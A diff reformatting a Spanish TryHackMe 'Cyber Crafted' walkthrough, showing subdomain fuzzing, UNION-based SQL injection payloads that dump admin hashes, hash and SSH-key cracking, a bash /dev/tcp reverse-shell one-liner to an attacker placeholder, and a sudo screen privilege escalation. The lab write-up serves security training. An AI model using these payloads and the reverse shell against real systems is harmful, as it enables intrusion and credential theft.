@@ -1,22 +1,32 @@
 ---
 title: Cyber Crafted - Tryhackme
-date: 2023-11-25
-categories: [Write up, Linux, Tryhackme]
-tags: [subdomain, sqlinjection, cracking, screen, medium]     # TAG names should always be lowercase
+date: 2023-11-25T00:00:00.000Z
+categories:
+  - Write up
+  - Linux
+  - Tryhackme
+tags:
+  - subdomain
+  - sqlinjection
+  - cracking
+  - screen
+  - medium
 ---
+
+# Cyber Crafted
 
 En esta maquina vamos a realizar explotacion de un servicio web en la cual debnemos enumerar los sundominios, es tos subdominios encontraremos un panel donde es vulnerable a sql injection para encontrar credenciales validas. Para la escalada de privilegios haremos uso de credenciales que encontraremos enumerando el sistema para luego explotar un binario que tenemos permisos privilegiados.
 
 ![20231121025549.png](20231121025549.png)
 
-- Link  [cybercrafted](https://tryhackme.com/room/cybercrafted)
+* Link [cybercrafted](https://tryhackme.com/room/cybercrafted)
+* Created by  [madrinch](https://tryhackme.com/p/madrinch)
 
-- Created by  [madrinch](https://tryhackme.com/p/madrinch)
+## Walkthrough
 
-# Walkthrough
---- 
+***
 
-## Enumeración
+### Enumeración
 
 Empezamos a enumerar los puertos que estan abiertos de la maquina victima
 
@@ -54,7 +64,8 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Los puertos que encotramos son: `22`, `80` y `25565`
 
-### Puerto 80
+#### Puerto 80
+
 Enumerando el puerto `80` tendremos que nos redirige a un dominio. Dominio que agregaremos en el `/etc/hosts`
 
 ```
@@ -66,9 +77,9 @@ Visitando el sitio web encontraremos el siguiente contenido
 
 ![20231121025926.png](20231121025926.png)
 
-Enumerando de manera visual, no encontramos nada. Realizaremos una enumeración de los directorios del sitio web haciendo uso de `ffuf`, pero no encontramos nada interesante asi que procedi a enumerar subdominios 
+Enumerando de manera visual, no encontramos nada. Realizaremos una enumeración de los directorios del sitio web haciendo uso de `ffuf`, pero no encontramos nada interesante asi que procedi a enumerar subdominios
 
-### Fuzzing
+#### Fuzzing
 
 ```php
 ❯ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.cybercrafted.thm" -u http://10.10.70.213 -fl 1
@@ -84,11 +95,11 @@ admin.cybercrafted.thm
 store.cybercrafted.thm
 ```
 
-En ``admin.cybercrafted.thm`` encontraremos un panel de login que no se puede hacer mucho. 
+En `admin.cybercrafted.thm` encontraremos un panel de login que no se puede hacer mucho.
 
 ![20231121110801.png](20231121110801.png)
 
-Viendo el contenido de cada uno de los otros subdominios no se encontró mucho, por lo que pasamos a enumerar los directorios. En el subdominio que si encontramos algo interesante es: `store.cybercrafted.thm ` 
+Viendo el contenido de cada uno de los otros subdominios no se encontró mucho, por lo que pasamos a enumerar los directorios. En el subdominio que si encontramos algo interesante es: `store.cybercrafted.thm`
 
 ```php
 ❯ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://store.cybercrafted.thm -t 150 -x txt,html,bd,zip,php
@@ -97,18 +108,17 @@ Viendo el contenido de cada uno de los otros subdominios no se encontró mucho, 
 
 ![20231121154515.png](20231121154515.png)
 
-## Explotación
+### Explotación
 
-### SQL injection
+#### SQL injection
 
-`store.cybercrafted.thm/search.php` Encont!ramos un panel de busqueda de items, que hace una consulta a una base de datos.
-[20231121155647.png](20231121155647.png)
+`store.cybercrafted.thm/search.php` Encont!ramos un panel de busqueda de items, que hace una consulta a una base de datos. [20231121155647.png](../CyberCrafted/20231121155647.png)
 
 Ingreseando `seven' union select 1,2,3,4-- -` podemos ver que el 2,3,4 nos muestra en la fila.
 
 ![20231121165929.png](20231121165929.png)
 
-Procederemos a enumerar los nombres de las bases de datos `seven' union select 1,schema_name,3,4 from information_schema.schemata-- `
+Procederemos a enumerar los nombres de las bases de datos `seven' union select 1,schema_name,3,4 from information_schema.schemata--`
 
 ![20231121170009.png](20231121170009.png)
 
@@ -123,13 +133,14 @@ webapp
 ```
 
 La que nos parece interesante es `webapp`, por lo que enumeraremos las tablas que contiene esta base de datos.
+
 ```php
 seven' union select 1,table_name,3,4 from information_schema.tables where table_schema='webapp'-- -
 ```
 
 ![20231121170329.png](20231121170329.png)
 
-La base de datos `webapp` contiene dos tablas que son `admin` y `stock` 
+La base de datos `webapp` contiene dos tablas que son `admin` y `stock`
 
 Continuamos con la enumeración de la base de datos, en esta enumeraremos las columnas que contiene la tabla.
 
@@ -139,11 +150,12 @@ seven' union select 1,column_name,3,4 from information_schema.columns where tabl
 
 ![20231121170720.png](20231121170720.png)
 
-Tenemos las columnas de `id`, `user` y `hash`. Conociendo estos datos realizaremos una consulta a la tabla  con los siguiente: `seven' union select 1,id,user,hash from webapp.admin-- -`
+Tenemos las columnas de `id`, `user` y `hash`. Conociendo estos datos realizaremos una consulta a la tabla con los siguiente: `seven' union select 1,id,user,hash from webapp.admin-- -`
 
 ![20231121171125.png](20231121171125.png)
 
-### Cracking de hashes
+#### Cracking de hashes
+
 Nos encontramos con credenciales que parecen estar encriptadas, así que procederemos a crackearlas con [Crackstation](https://crackstation.net/). Existen varias herramientas que te pueden ayudar a crackear, asi que sientete libre de usar la que se te hace mas comoda
 
 ```
@@ -159,15 +171,18 @@ Usaremos estas credenciales para ingresar al panel de login que vimos al inicio 
 xXUltimateCreeperXx : diamond123456789
 ```
 
-### Ejecución de comandos
+#### Ejecución de comandos
+
 Podemos ejecutar comandos. Ahora lo que haremos será enviarnos una revershell para obtener una consola de la maquina victima.
 
 ![20231121171738.png](20231121171738.png)
 
 Ingresamos el siguiente comando: `bash -c 'exec bash -i &>/dev/tcp/[IP-ATTACKER]/443 <&1'` en mi caso es lo que mayormente suelo usar, tu puedes usar otro si gustas
 
-## Escalada de privilegios
-### Usuario www-data
+### Escalada de privilegios
+
+#### Usuario www-data
+
 Una vez obtenida la shell como el usuario `www-data`
 
 ![20231121174025.png](20231121174025.png)
@@ -178,13 +193,13 @@ Enumerando encontraremos un archivo `id_rsa` que tenemos permisos para leerlo
 
 Con este archivo podemos ingresar por `ssh` sin proporcionar credenciales, pero antes tenemos que crackearla debido a que esta protegida por contraseña
 
- 1. Generamos el hash con `ssh2john`
- 
+1. Generamos el hash con `ssh2john`
+
 ```php
 ❯ ssh2john id_rsa > hash
 ```
 
-2. Crackeamos con `john` 
+2. Crackeamos con `john`
 
 ```php
 ❯ john --wordlist=/usr/share/wordlists/rockyou.txt hash
@@ -201,6 +216,7 @@ Session completed.
 ```
 
 3. Cambiamos los permisos de archivo `ìd_rsa`
+
 ```php
 ❯ chmod 600 id_rsa
 
@@ -208,18 +224,20 @@ creepin2006
 ```
 
 4. Ejecutamos
+
 ```php
 ❯ ssh -i id_rsa xxultimatecreeperxx@10.10.70.213
 ```
 
-5.  Ingresamos la contraseña y podemos ingresar como el usuario `xxultimatecreeperxx`
-### Usuario - xxultimatecreeperxx
-![20231121175040.png](20231121175040.png)
-Enumerando las ta20231121175040.pngreas que se ejecutan en el sistema, podemos observar una, de esto nos interesa la ruta donde se se realizando el comprimido
+5. Ingresamos la contraseña y podemos ingresar como el usuario `xxultimatecreeperxx`
+
+#### Usuario - xxultimatecreeperxx
+
+![20231121175040.png](20231121175040.png) Enumerando las ta20231121175040.pngreas que se ejecutan en el sistema, podemos observar una, de esto nos interesa la ruta donde se se realizando el comprimido
 
 ![20231121175614.png](20231121175614.png)
 
-Antes de ir al directorio vemos que pertenecemos a un grupo llamando `minecraft` 
+Antes de ir al directorio vemos que pertenecemos a un grupo llamando `minecraft`
 
 ```php
 xxultimatecreeperxx@cybercrafted:~$ id
@@ -239,24 +257,25 @@ En especial uno que nos llama la atención que es `log.txt` en donde encontrarem
 cybercrafted : JavaEdition>Bedrock
 ```
 
-
 ![20231121190531.png](20231121190531.png)
 
-### Usuario - cybercrafted
+#### Usuario - cybercrafted
+
 Teniendo credenciales validad para este usuario, procedemos a enumerar y podemos ver que el usuario puede ejecutar `/usr/bin/screen -r cybercrafted` de manera privilegiada
 
 ![20231121191915.png](20231121191915.png)
 
-Por lo que ejecutamos 
+Por lo que ejecutamos
+
 ```php
 sudo /usr/bin/screen -r cybercrafted
 ```
 
 ![20231121191813.png](20231121191813.png)
 
-Ahora para escapar precionamos las teclas `ctrl + A ` y luego ` ctrl+ C` 
+Ahora para escapar precionamos las teclas `ctrl + A` y luego `ctrl+ C`
 
-### Usuario - root
+#### Usuario - root
 
 ![20231121191953.png](20231121191953.png)
 
